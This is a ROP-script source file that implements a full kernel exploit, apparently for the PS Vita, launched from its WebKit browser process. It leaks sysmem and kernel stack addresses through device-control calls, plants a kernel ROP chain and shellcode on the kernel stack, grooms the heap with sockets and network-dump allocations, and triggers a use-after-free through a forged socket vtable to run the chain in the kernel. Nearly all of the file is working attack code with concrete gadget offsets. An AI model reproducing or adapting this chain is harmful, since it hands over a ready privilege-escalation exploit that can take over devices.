#include "common.rop"

data
{
	#include "functions.rop"

	buffer ioctl[0x400];
	buffer crap[0x100];
	buffer our_data[0x404];
	variable file_uid = -1;
	variable kernel_stack_base = -1;
	variable sysmem_base;

	<% need_sockets = 80 %>
	symbol need_sockets = <%= need_sockets %>;
	buffer sockets[<%= need_sockets * 4 %>];
	variable free1;
	variable tester;
	variable tmp;
	variable dump_to_free;
	variable another_hole;
	<% need_dumps = 9 %>
	buffer dumps_to_delete[<%= need_dumps * 4 %>];

	variable rop_thread_id; // thread calling vulnerable syscall
	buffer thread_info[0x80];
	buffer device_name[0x10];
	buffer command[0x10];
	buffer open_device_name[0x10];
	symbol stack_size = 0x2000;
	variable stack_base;
	buffer user_ropchain[0x100];
	variable pret;
	buffer ldm_buf[7 * 4];
	buffer mybuf[0x100];
	variable vptr;
	buffer args_buf_first[0x10];
	buffer args_buf_second[0x10];
	buffer kernel_ropchain[0x100];

	variable plant_thread_id;
	variable plant_stack_base;

	symbol stack_shellcode_offset = 0x200;
	symbol sysmem_shellcode_offset = 0x27640;
	symbol stack_rop_offset = 4;
	symbol kstack_offset_to_data = 1784;
}

code : entry
{
	PRINTF("started\n");
	strcat(our_data, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B");

	strcat(device_name, "sdstor0:");
	strcat(command, "xmc-lp-ign-userext");
	memset(ioctl, 0, 0x400);
	strcat(open_device_name, "molecule0:");

	sceIoOpen(open_device_name, 0, 0);
	sceIoDevctl(device_name, 5, command, 0x14, ioctl, 0x3FF); // only leak sysmem from this call
	add([ioctl+0x3D4], -0x5747);
	store(&return, sysmem_base);
	PRINTF("sysmem base: 0x%x \n", [sysmem_base]);

#if 0
	sceIoOpen("host0:stack.bin", 0x602, 6);
	store(&return, file_uid);
	PRINTF("%x\n", [file_uid]);
	sceIoWrite([file_uid], ioctl, 0x400);
	sceIoClose([file_uid]);
#endif


	// plant thread leaks kernel stack via devctl and inserts the payload there using another devctl

	sceKernelCreateThread("pln", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, plant_thread_id);
	PRINTF("plant thread %x \n", [plant_thread_id]);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([plant_thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, plant_stack_base);

	<% i = -1 %>
	store(0x14, args_buf_first+0);
	store(ioctl, args_buf_first+4);
	store(0x3FF, args_buf_first+8);

	store(0x400, args_buf_second+0);
	store(0, args_buf_second+4);
	store(0, args_buf_second+8);

	// build user ropchain -- for plant thread
	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(open_device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(0, user_ropchain + <%=i+=1%> * 4); // r1
	store(0, user_ropchain + <%=i+=1%> * 4); // r2
	store(0, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoOpen, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => sceIoOpen to populate kernel stack
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(5, user_ropchain + <%=i+=1%> * 4); // r1
	store(command, user_ropchain + <%=i+=1%> * 4); // r2
	store(args_buf_first, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoDevctl_svc, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => first devctl to leak stack/sysmem addr
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(1 * 1000 * 1000, user_ropchain + <%=i+=1%> * 4); // r0
	store(0, user_ropchain + <%=i+=1%> * 4); // r1
	store(0, user_ropchain + <%=i+=1%> * 4); // r2
	store(0, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceKernelDelayThread, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => delay to sync our two threads
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(5, user_ropchain + <%=i+=1%> * 4); // r1
	store(our_data, user_ropchain + <%=i+=1%> * 4); // r2
	store(args_buf_second, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoDevctl_svc, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => second devctl to plant our data into kmem
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(infloop, user_ropchain + <%=i+=1%> * 4); // infloop

	// copy user ropchain into user stack
	memcpy([plant_stack_base], user_ropchain, 0x100);
	// set up args for LDM user thread stack pivot
	store([plant_stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);
	sceKernelStartThread([plant_thread_id], 7 * 4, ldm_buf); // it should hang
	PRINTF("start plant rop thread 0x%x\n", &return);
	// plant thread end
	sceKernelDelayThread(100 * 1000); // sleep 0.1s


	add([ioctl+0x3C4], -0xABC);
	store(&return, kernel_stack_base);
	PRINTF("kernel stack: 0x%x (?)\n", [kernel_stack_base]);

	// set up data for kernel
	add([sysmem_base], 0x1e460); // ldm R0, {R4,R10,R12,SP,PC}
	store(&return, our_data); // future function ptr

	// layout: [ ldm_gadget ] [ kernel ropchain .... ] ... [ payload? ]
	// remember: we only have 0x400 bytes, and the less we use the better

	// kernel ropchain
	// can do the define trick because preprocessor runs before erb
	#define NEXT kernel_ropchain+4*<%=i+=1%>
	#define STORE_OFFSET(off) \
		add([sysmem_base], off); \
		store(&return, NEXT)
	#define STORE(addr) \
		store(addr, NEXT)
	<% i = -1 %>

	STORE_OFFSET(0x2632f); // pop {r0, r1, r2, r3, r4, pc}
	STORE_OFFSET(sysmem_shellcode_offset); // r0 => shellcode dst
	add([kernel_stack_base], kstack_offset_to_data);
	add(&return, stack_shellcode_offset);
	STORE(&return); // r1 => shellcode src
	STORE(0x100); // r2 => shellcode sz
	STORE_OFFSET(0x23095); // r3 => dacr memcpy
	STORE(0); // r4
	STORE_OFFSET(0x39eb); // pc => blx r3 ; pop {r3, pc}
	STORE(0); // r3
	STORE_OFFSET(sysmem_shellcode_offset+1);

	#undef NEXT
	#undef STORE_OFFSET
	#undef STORE

	PRINTF("krop end\n");

	// kernel ropchain end
	memcpy(our_data + stack_rop_offset, kernel_ropchain, 0x100);

	// set up shellcode
	store(0xE7FE, our_data + stack_shellcode_offset);

	// after the plant thread wakes up, it should copy our_data into kernel stack


	// trigger rootkit
	// sceIoClose(0xb00b5);

	// set up overwritten socket structure
	add([kernel_stack_base], 1756);
	store(&return, mybuf + 6 * 4); // vptr
	add([kernel_stack_base], kstack_offset_to_data);
	add(&return, stack_rop_offset);
	store(&return, mybuf + 3 * 4); // sp
	add([sysmem_base], 0x347); // pop {pc} to kick off the ropchain
	store(&return, mybuf + 4 * 4);
	PRINTF("hacked vtable at 0x%x\n", [mybuf + 0x18]);

	// create and set up rop thread that will call vulnerable syscall
	sceKernelCreateThread("mhm", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, rop_thread_id);
	PRINTF("thread %x \n", [rop_thread_id]);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([rop_thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, stack_base);

	// create a lot of sockets
	<% need_sockets.times do |socket_id| %>
	socket("x", 2, 1, 0);
	store(&return, sockets + 4 * <%= socket_id %>);
	PRINTF("socket %d \n", [sockets + 4 * <%= socket_id %>]);
	<% end %>

	PRINTF("enough of this\n");

	socket("sss", 2, 1, 0);
	store(&return, free1);
	
	socket("tst", 2, 7, 0);
	store(&return, tester);
	
	PRINTF("tester socket %d\n", [tester]);

	// build user ropchain
	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + 0 * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store([tester], user_ropchain + 1 * 4); // r0
	store(0x10007300, user_ropchain + 2 * 4); // r1
	store(0, user_ropchain + 3 * 4); // r2
	store(0, user_ropchain + 4 * 4); // r3
	store(sceNetSyscallIoctl, user_ropchain + 5 * 4); // r4
	store(0, user_ropchain + 6 * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + 7 * 4); // blx r4 ; pop {r4, pc}
	store(pret, user_ropchain + 8 * 4); // r4
	store(ASLR::SceWebKit + 0x59a9, user_ropchain + 9 * 4); // 0x000059a8 : str r0, [r4] ; pop {r4, pc}
	store(0, user_ropchain + 10 * 4); // r4
	store(infinite_loop, user_ropchain + 11 * 4); // pc
	// copy user ropchain into user stack
	memcpy([stack_base], user_ropchain, 0x100);
	// set up args for LDM user thread stack pivot
	store([stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);
	
	socket("tmp", 2, 1, 0);
	store(&return, tmp);

	<% need_dumps.times do |dump_id| %>
	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, dumps_to_delete + <%= 4 * dump_id %>);
	<% end %>

	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, another_hole);
	
	sceNetDumpCreate("ddd", 0x1000, 0);
	store(&return, dump_to_free);
	
	PRINTF("dump_to_free: 0x%08X\n", [dump_to_free]);	

	PRINTF("now free some stuffs and create holes...  \n");

	// free some memory and create holes
	<% (0..need_dumps-1).step(2) do |dump_id| %>
	sceNetDumpDestroy([dumps_to_delete + <%= 4 * dump_id %>]);
	<% end %>

	sceNetDumpDestroy([another_hole]);

	sceNetDumpCreate("ddd", 0xD0000, 0);
	PRINTF("create large 0xD0000 0x%x\n", &return);

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("another 0x%x\n", &return);

/*
	<% (0x1000).step(0x100, -0x100) do |dump_sz| %>
	sceNetDumpCreate("ddd", <%= dump_sz %>, 0);
	PRINTF("try size 0x<%= dump_sz.to_s(16) %> get 0x%x   \n", &return);
	<% end %>
*/

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("last dump size=0x1000 ret=0x%x (should be=0x8041010c) \n", &return);

	sceKernelStartThread([rop_thread_id], 7 * 4, ldm_buf); // it should hang
	PRINTF("start user rop thread 0x%x\n", &return);

	sceKernelDelayThread(1500*1000);
	// free sockets
	<% (0..need_sockets-1).step(2) do |socket_id| %>
	sceNetSyscallClose([sockets + <%= 4 * socket_id %>]);
	PRINTF("close ret 0x%x\n", &return);
	<% end %>

	sceNetSyscallClose([tester]);
	PRINTF("free tester 0x%x\n", &return);
	sceNetSyscallControl(0, 0x30000000, mybuf, 0xFC);
	sceNetDumpDestroy([dump_to_free]);

	sceKernelDelayThread(1*1000*1000);
	PRINTF("user thread reports %d\n", [pret]);

	add([pret], 1052); // => should be zero now
	add(&return, infloop);  // => crash on fail infloop on success
	call_r0(0);

	infloop();
}
